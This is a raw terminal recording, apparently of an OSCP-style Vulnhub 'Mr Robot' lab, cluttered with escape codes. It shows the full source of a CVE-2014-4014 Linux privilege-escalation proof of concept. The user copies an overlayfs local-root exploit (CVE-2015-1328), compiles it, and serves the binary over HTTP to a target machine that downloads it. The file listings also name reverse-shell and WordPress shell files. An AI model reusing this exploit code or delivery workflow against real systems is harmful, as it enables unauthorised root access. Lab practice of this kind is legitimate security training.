+[1;39r[36;5H[32mchar[39m(B[m map_file[(B[0;1m[31mPATH_MAX[39m(B[m];[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H[32mstruct[39m(B[m args f_args;[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hassert(argc == 2);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hf_args.file_path = argv[1];[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H(B[0;1m[34m// create a pipe for synching the child and parent[39m(B[m[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hassert(pipe(f_args.pipe_fd) != -1);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hpid = clone(child, child_stack + (B[0;1m[31mSTACK_SIZE[39m(B[m, (B[0;1m[31mCLONE_NEWUSER[39m(B[m | (B[0;1m[31mSIGCHLD[39m(B[m, &f_args);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hassert(pid != -1);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H(B[0;1m[34m// get the current uid outside the namespace[39m(B[m[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hsnprintf(mapping, 1024, (B[0;1m[33m"0 %d 1\n"[39m(B[m, getuid());[42m [49m(B[m[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5H(B[0;1m[34m// update uid and gid maps in the child[39m(B[m[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hsnprintf(map_file, (B[0;1m[31mPATH_MAX[39m(B[m, (B[0;1m[33m"/proc/%ld/uid_map"[39m(B[m, ([32mlong[39m(B[m) pid);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hfd = open(map_file, (B[0;1m[31mO_RDWR[39m(B[m); assert(fd != -1);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hassert(write(fd, mapping, strlen(mapping)) == strlen(mapping));[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hclose(f_args.pipe_fd[1]);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;5Hassert (waitpid(pid, (B[0;1m[31mNULL[39m(B[m, 0) != -1);[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H}[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[38d[J[39d[?12l[?25h[39;1H[?1049l[23;0;0t[?1l>[?2004l]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# nano 33824.c 
+[?2004h[?1049h[22;0;0t[1;39r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[37;77H(B[0;7m[ Reading... ](B[m[37;61H(B[0;7m[ Read 72 lines (Converted from DOS format) ](B[m[H(B[0;7m  GNU nano 4.9.3                                                                  33824.c                                                                             [1;165H(B[m[38d(B[0;7m^G(B[m Get Help     (B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut Text     (B[0;7m^J(B[m Justify[81G(B[0;7m^C(B[m Cur Pos[97G(B[0;7mM-U(B[m Undo[38;113H(B[0;7mM-A(B[m Mark Text   (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[39d(B[0;7m^X(B[m Exit[39;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste Text   (B[0;7m^T(B[m To Spell     (B[0;7m^_(B[m Go To Line   (B[0;7mM-E(B[m Redo[39;113H(B[0;7mM-6(B[m Copy Text   (B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[37d[2d(B[0;1m[34m/**[3d * CVE-2014-4014 Linux Kernel Local Privilege Escalation PoC[4d *[5d * Vitaly Nikolenko[6d * http://hashcrack.org[7d *[8d * Usage: ./poc [file_path][9d *(B[0m[42m [10d(B[0;1m[34m * where file_path is the file on which you want to set the sgid bit[11d */[12d[36m#define[39m(B[m (B[0;1m[31m_GNU_SOURCE[13d[36m#include[33m <sys/wait.h>[14d[36m#include[33m <sched.h>[15d[36m#include[33m <stdio.h>[16d[36m#include[33m <stdlib.h>[17d[36m#include[33m <unistd.h>[18d[36m#include[33m <fcntl.h>[19d[36m#include[33m <limits.h>[20d[36m#include[33m <string.h>[21d[36m#include[33m <assert.h>[23d[36m#define[39m(B[m (B[0;1m[31mSTACK_SIZE[39m(B[m (1024 * 1024)[24d[32mstatic[39m(B[m [32mchar[39m(B[m child_stack[(B[0;1m[31mSTACK_SIZE[39m(B[m];[26d[32mstruct[39m(B[m args {[27;5H[32mint[39m(B[m pipe_fd[2];[28;5H[32mchar[39m(B[m *file_path;[29d};[31d[32mstatic[39m(B[m [32mint[39m(B[m child([32mvoid[39m(B[m *arg) {[32;5H[32mstruct[39m(B[m args *f_args = ([32mstruct[39m(B[m args *)arg;[33;5H[32mchar[39m(B[m c;[35;5H(B[0;1m[34m// close stdout[36;5H[39m(B[mclose(f_args->pipe_fd[1]);[42m [2d[49m(B[m[?12l[?25h[?25l[?12l[?25h[?25l[5d[?12l[?25h[?25l[8d[?12l[?25h[?25l[11d[?12l[?25h[?25l[8d[?12l[?25h[?25l[7;3H[?12l[?25h[?25l[8d[?12l[?25h[?25l[9d[?12l[?25h[?25l[10d[?12l[?25h[?25l[11d[?12l[?25h[?25l[A[?12l[?25h[?25l[13d[?12l[?25h[?25l[37d[K[16d[?12l[?25h[?25l[19d[?12l[?25h[?25l[22d[?12l[?25h[?25l[25d[?12l[?25h[?25l[28d[?12l[?25h[?25l[31d[?12l[?25h[?25l[34d[?12l[?25h[?25l[2;37r[37;1H
+[1;39r[36;1H[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5Hassert(read(f_args->pipe_fd[0], &c, 1) == 0);[36;5H(B[0;1m[34m// set the setgid bit[39m(B[m[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5Hchmod(f_args->file_path, (B[0;1m[31mS_ISGID[39m(B[m|(B[0;1m[31mS_IRUSR[39m(B[m|(B[0;1m[31mS_IWUSR[39m(B[m|(B[0;1m[31mS_IRGRP[39m(B[m|(B[0;1m[31mS_IXGRP[39m(B[m|(B[0;1m[31mS_IXUSR[39m(B[m);[36;5H[35mreturn[39m(B[m 0;[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;1H}[36d[32mint[39m(B[m main([32mint[39m(B[m argc, [32mchar[39m(B[m *argv[]) {[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5H[32mint[39m(B[m fd;[35;5H[32mpid_t[39m(B[m pid;[36;5H[32mchar[39m(B[m mapping[1024];[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5H[32mchar[39m(B[m map_file[(B[0;1m[31mPATH_MAX[39m(B[m];[35;5H[32mstruct[39m(B[m args f_args;[36d[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5Hassert(argc == 2);[36;5Hf_args.file_path = argv[1];[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5H(B[0;1m[34m// create a pipe for synching the child and parent[35;5H[39m(B[massert(pipe(f_args.pipe_fd) != -1);[36d[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5Hpid = clone(child, child_stack + (B[0;1m[31mSTACK_SIZE[39m(B[m, (B[0;1m[31mCLONE_NEWUSER[39m(B[m | (B[0;1m[31mSIGCHLD[39m(B[m, &f_args);[35;5Hassert(pid != -1);[36d[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5H(B[0;1m[34m// get the current uid outside the namespace[35;5H[39m(B[msnprintf(mapping, 1024, (B[0;1m[33m"0 %d 1\n"[39m(B[m, getuid());[42m [36d[49m(B[m[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[34;5H(B[0;1m[34m// update uid and gid maps in the child[35;5H[39m(B[msnprintf(map_file, (B[0;1m[31mPATH_MAX[39m(B[m, (B[0;1m[33m"/proc/%ld/uid_map"[39m(B[m, ([32mlong[39m(B[m) pid);[36;5Hfd = open(map_file, (B[0;1m[31mO_RDWR[39m(B[m); assert(fd != -1);[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[35;5Hassert(write(fd, mapping, strlen(mapping)) == strlen(mapping));[36;5Hclose(f_args.pipe_fd[1]);[?12l[?25h[?25l7[2;37r8[37d[3S[1;39r[35;5Hassert (waitpid(pid, (B[0;1m[31mNULL[39m(B[m, 0) != -1);[36d}[?12l[?25h[?25l7[2;37r8[37d
+[1;39r[36;1H[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[?25l[33d[?12l[?25h[?25l[30d[?12l[?25h[?25l[27d[?12l[?25h[?25l[24d[?12l[?25h[?25l[21d[?12l[?25h[?25l[18d[?12l[?25h[?25l[15d[?12l[?25h[?25l[12d[?12l[?25h[?25l[9d[?12l[?25h[?25l[6d[?12l[?25h[?25l[3d[?12l[?25h[?25l[2;36r[2;1H[2T[1;39r[2;5Hassert(read(f_args->pipe_fd[0], &c, 1) == 0);[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;5H(B[0;1m[34m// close stdout[3;5H[39m(B[mclose(f_args->pipe_fd[1]);[42m [A[49m(B[m[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;5H[32mstruct[39m(B[m args *f_args = ([32mstruct[39m(B[m args *)arg;[3;5H[32mchar[39m(B[m c;[A[?12l[?25h[?25l7[2;37r8[3T[1;39r[2;1H};[4d[32mstatic[39m(B[m [32mint[39m(B[m child([32mvoid[39m(B[m *arg) {[2d[?12l[?25h[?25l7[2;37r8[3T[1;39r[2;1H[32mstruct[39m(B[m args {[3;5H[32mint[39m(B[m pipe_fd[2];[4;5H[32mchar[39m(B[m *file_path;[2d[?12l[?25h[?25l7[2;37r8[3T[1;39r[2;1H(B[0;1m[36m#define[39m(B[m (B[0;1m[31mSTACK_SIZE[39m(B[m (1024 * 1024)[3d[32mstatic[39m(B[m [32mchar[39m(B[m child_stack[(B[0;1m[31mSTACK_SIZE[39m(B[m];[A[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;1H(B[0;1m[36m#include[33m <string.h>[3d[36m#include[33m <assert.h>[A[39m(B[m[?12l[?25h[?25l7[2;37r8[3T[1;39r[2;1H(B[0;1m[36m#include[33m <unistd.h>[3d[36m#include[33m <fcntl.h>[4d[36m#include[33m <limits.h>[2d[39m(B[m[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;1H(B[0;1m[36m#include[33m <sched.h>[3d[36m#include[33m <stdio.h>[4d[36m#include[33m <stdlib.h>[2d[39m(B[m[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;1H(B[0;1m[34m */[3d[36m#define[39m(B[m (B[0;1m[31m_GNU_SOURCE[4d[36m#include[33m <sys/wait.h>[2d[39m(B[m[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;1H(B[0;1m[34m * Usage: ./poc [file_path][3d *(B[0m[42m [4d(B[0;1m[34m * where file_path is the file on which you want to set the sgid bit[2d[39m(B[m[?12l[?25h[?25l7[2;36r8[3T[1;39r[2;1H(B[0;1m[34m * Vitaly Nikolenko[3d * http://hashcrack.org[4d *[2d[39m(B[m[?12l[?25h[?25l7[2;37r8[3T[1;39r[2;1H(B[0;1m[34m/**[3d * CVE-2014-4014 Linux Kernel Local Privilege Escalation PoC[4d *[2d[39m(B[m[?12l[?25h[?25l[?12l[?25h[?25l[38d[J[39d[?12l[?25h[39;1H[?1049l[23;0;0t[?1l>[?2004l]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# cp /usr/share/exploitdb/exploits/linux/local/37292.c .
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ls
+33824.c                             dirb         hash            license       nikto-2  notes.txt                    searchsploit  wpscan-3
+37292.c                             dirb-2       hydra           mrrobot2.txt  nmap     [0m[01;34mphp-reverse-shell[0m            usuario.txt   wpshell.php
+bf-wpscan                           discover     hydra.restore   mrrobot.txt   nmap-2   [01;35mreverse-shell-wordpress.png[0m  wpscan        wpxpl
+[01;35mburp-suite_wp-login_parametros.png[0m  fsocity.dic  key-1-of-3.txt  nikto         nmap-3   robots.txt                   wpscan-2      [01;32mxpl[0m
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# g[Kc[Knano 37292.c 
+[?2004h[?1049h[22;0;0t[1;39r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[37;77H(B[0;7m[ Reading... ](B[m[37;61H(B[0;7m[ Read 152 lines (Converted from DOS format) ](B[m[H(B[0;7m  GNU nano 4.9.3                                                                  37292.c                                                                             [1;165H(B[m[38d(B[0;7m^G(B[m Get Help     (B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut Text     (B[0;7m^J(B[m Justify[81G(B[0;7m^C(B[m Cur Pos[97G(B[0;7mM-U(B[m Undo[38;113H(B[0;7mM-A(B[m Mark Text   (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[39d(B[0;7m^X(B[m Exit[39;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste Text   (B[0;7m^T(B[m To Spell     (B[0;7m^_(B[m Go To Line   (B[0;7mM-E(B[m Redo[39;113H(B[0;7mM-6(B[m Copy Text   (B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[37d[2d(B[0;1m[34m/*[3d# Exploit Title: ofs.c - overlayfs local root in ubuntu[4d# Date: 2015-06-15[5d# Exploit Author: rebel[6d# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)[7d# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04[8d# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)[10d*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*[11dCVE-2015-1328 / ofs.c[12doverlayfs incorrect permission handling + FS_USERNS_MOUNT[14duser@ubuntu-server-1504:~$ uname -a[15dLinux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux[16duser@ubuntu-server-1504:~$ gcc ofs.c -o ofs[17duser@ubuntu-server-1504:~$ id[18duid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)[19duser@ubuntu-server-1504:~$ ./ofs[20dspawning threads[21dmount #1[22dmount #2[23dchild threads done[24d/etc/ld.so.preload created[25dcreating shared library[26d# id[27duid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)[29dgreets to beist & kaliman[30d2015-05-24[31d%rebel%[32d*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*[33d*/[35d[36m#include[33m <stdio.h>[36d[36m#include[33m <stdlib.h>[2d[39m(B[m[?12l[?25h[?25l[3d[?12l[?25h[?25l[4d[?12l[?25h[?25l[5d[?12l[?25h[?25l[6d[?12l[?25h[?25l[7d[?12l[?25h[?25l[8d[?12l[?25h[?25l[9d[?12l[?25h[?25l[10d[?12l[?25h[?25l[11d[?12l[?25h[?25l[37d[J[39d[?12l[?25h[39;1H[?1049l[23;0;0t[?1l>[?2004l]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# rm 33824.c 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# rmx[K xpl 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ls
+37292.c                             dirb-2       hydra           mrrobot2.txt  nmap       [0m[01;34mphp-reverse-shell[0m            usuario.txt  wpshell.php
+bf-wpscan                           discover     hydra.restore   mrrobot.txt   nmap-2     [01;35mreverse-shell-wordpress.png[0m  wpscan       wpxpl
+[01;35mburp-suite_wp-login_parametros.png[0m  fsocity.dic  key-1-of-3.txt  nikto         nmap-3     robots.txt                   wpscan-2
+dirb                                hash         license         nikto-2       notes.txt  searchsploit                 wpscan-3
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# gcc 37292.c -o c[Kxpl
+[01m[K37292.c:[m[K In function ‘[01m[Kmain[m[K’:
+[01m[K37292.c:106:12:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kunshare[m[K’ [[01;35m[K-Wimplicit-function-declaration[m[K]
+  106 |         if([01;35m[Kunshare[m[K(CLONE_NEWUSER) != 0)
+      |            [01;35m[K^~~~~~~[m[K
+[01m[K37292.c:111:17:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kclone[m[K’; did you mean ‘[01m[Kclose[m[K’? [[01;35m[K-Wimplicit-function-declaration[m[K]
+  111 |                 [01;35m[Kclone[m[K(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+      |                 [01;35m[K^~~~~[m[K
+      |                 [32m[Kclose[m[K
+[01m[K37292.c:117:13:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kwaitpid[m[K’ [[01;35m[K-Wimplicit-function-declaration[m[K]
+  117 |             [01;35m[Kwaitpid[m[K(pid, &status, 0);
+      |             [01;35m[K^~~~~~~[m[K
+[01m[K37292.c:127:5:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function ‘[01m[Kwait[m[K’ [[01;35m[K-Wimplicit-function-declaration[m[K]
+  127 |     [01;35m[Kwait[m[K(NULL);
+      |     [01;35m[K^~~~[m[K
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ls
+37292.c                             dirb-2       hydra           mrrobot2.txt  nmap       [0m[01;34mphp-reverse-shell[0m            usuario.txt  wpshell.php
+bf-wpscan                           discover     hydra.restore   mrrobot.txt   nmap-2     [01;35mreverse-shell-wordpress.png[0m  wpscan       wpxpl
+[01;35mburp-suite_wp-login_parametros.png[0m  fsocity.dic  key-1-of-3.txt  nikto         nmap-3     robots.txt                   wpscan-2     [01;32mxpl[0m
+dirb                                hash         license         nikto-2       notes.txt  searchsploit                 wpscan-3
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# lsgcc 37292.c -o xplls[Krm xpl [4@33824.c[C[2@nano 37292[C[C[Cls[Kcp /usr/share/exploitdb/exploits/linux/local/37292.c .[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnano 33824.c [K[4Pxpl[Cpython -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+192.168.0.28 - - [27/Oct/2020 16:36:36] "GET /xpl HTTP/1.1" 200 -
+^CTraceback (most recent call last):
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
+    "__main__", fname, loader, pkg_name)
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
+    exec code in run_globals
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
+    test()
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
+    BaseHTTPServer.test(HandlerClass, ServerClass)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
+    httpd.serve_forever()
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
+    poll_interval)
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
+    return func(*args)
+KeyboardInterrupt
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# exit
+exit
+
+Script done on 2020-10-27 16:43:11-04:00 [COMMAND_EXIT_CODE="1"]
